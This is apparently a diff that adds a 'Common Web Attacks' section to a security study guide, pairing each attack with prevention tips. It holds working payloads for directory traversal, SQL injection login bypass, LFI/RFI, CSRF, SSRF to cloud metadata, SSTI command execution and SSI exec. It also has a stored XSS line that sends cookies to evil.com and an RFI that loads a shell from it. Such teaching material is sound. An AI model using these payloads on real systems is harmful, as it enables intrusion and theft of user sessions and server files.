@@ -935,6 +935,133 @@ Referrer-Policy: strict-origin-when-cross-origin
 * **same-origin:** only for same-origin requests
 * **no-referrer:** never send referrer
 
+## Common Web Attacks
+
+### Directory Traversal
+**Mechanism**: Exploits insufficient input validation to access files outside web root.
+```bash
+# Attack examples
+http://site.com/view.php?file=../../../etc/passwd
+http://site.com/download.php?path=....//....//etc/hosts
+```
+**Prevention**: Input validation, path canonicalization, chroot jails.
+
+### Authentication Bypass
+**Mechanism**: Circumvents authentication through logic flaws or injection.
+```sh
+# SQL injection bypass
+username: admin'--
+password: anything
+
+# Logic flaw
+POST /login HTTP/1.1
+authenticated=true&user=admin
+```
+**Prevention**: Secure session management, input validation, proper logic flow.
+
+### Insecure Direct Object Reference (IDOR)
+**Mechanism**: Direct access to objects without authorization checks.
+```bash
+# Vulnerable URLs
+GET /user/profile?id=123    # Access other users by changing ID
+GET /document/1234          # Access documents by guessing IDs
+```
+**Prevention**: Access control checks, indirect references, session validation.
+
+### File Inclusion (LFI/RFI)
+**Local File Inclusion**:
+```php
+# Vulnerable code
+include($_GET['page'] . '.php');
+
+# Attack
+http://site.com/index.php?page=../../../etc/passwd%00
+```
+
+**Remote File Inclusion**:
+```bash
+# Attack
+http://site.com/index.php?page=http://evil.com/shell.txt
+```
+**Prevention**: Input validation, allowlists, disable remote includes.
+
+### Cross Site Request Forgery (CSRF)
+**Mechanism**: Forces authenticated users to execute unwanted actions.
+```html
+<!-- Malicious site -->
+<img src="http://bank.com/transfer?to=attacker&amount=1000">
+<form action="http://bank.com/transfer" method="POST">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="1000">
+</form>
+<script>document.forms[0].submit();</script>
+```
+**Prevention**: CSRF tokens, SameSite cookies, referrer validation.
+
+### Cross Site Scripting (XSS)
+**Reflected XSS**:
+Reflected XSS occurs when user input is immediately returned by the server without proper sanitization.
+
+```javascript
+// App echoes a 'q' query parameter directly into the page.
+"http://site.com/search?q=<script>alert('XSS')</script>"
+
+// Page displays: Results for <script>alert('XSS')</script>
+```
+
+**Stored XSS**:
+Stored XSS occurs when malicious scripts are permanently stored on the target server, such as in a database, and executed when users access the affected content.
+```javascript
+<script>document.location='http://evil.com/steal.php?c='+document.cookie</script>
+```
+
+**DOM XSS**:
+DOM-based XSS occurs when the vulnerability exists in client-side code rather than server-side. The attack payload is executed as a result of modifying the DOM environment in the victim's browser.
+```javascript
+// URL: http://site.com#<script>alert('XSS')</script>
+document.getElementById('content').innerHTML = location.hash.substring(1);
+```
+**Prevention**: Output encoding, Content Security Policy, input validation.
+
+### Server Side Request Forgery (SSRF)
+**Mechanism**: Server makes requests to unintended locations.
+```bash
+# Internal service access
+http://site.com/fetch?url=http://localhost:8080/admin
+http://site.com/fetch?url=http://169.254.169.254/metadata
+
+# Cloud metadata
+http://site.com/proxy?url=http://169.254.169.254/latest/meta-data/
+```
+**Prevention**: URL allowlists, network segmentation, input validation.
+
+### Server Side Template Injection (SSTI)
+**Mechanism**: Injects malicious code into template engines.
+```python
+# Jinja2 (Python)
+{{7*7}}                           # Basic test → 49
+{{config.items()}}                # Access config
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+
+# Twig (PHP)
+{{7*7}}                           # Basic test → 49
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
+```
+**Prevention**: Sandboxed templates, input validation, avoid user-controlled templates.
+
+### Server Side Includes (SSI)
+**Mechanism**: Injects server-side directives in web pages.
+```html
+<!-- Basic SSI injection -->
+<!--#exec cmd="whoami"-->
+<!--#exec cmd="cat /etc/passwd"-->
+<!--#include file="/etc/passwd"-->
+
+<!-- URL injection -->
+http://site.com/page.shtml?name=<!--#exec cmd="id"-->
+```
+**Prevention**: Disable SSI, input validation, restricted SSI commands.
+
 # Secure Programming
 
 ## Secure C Programming
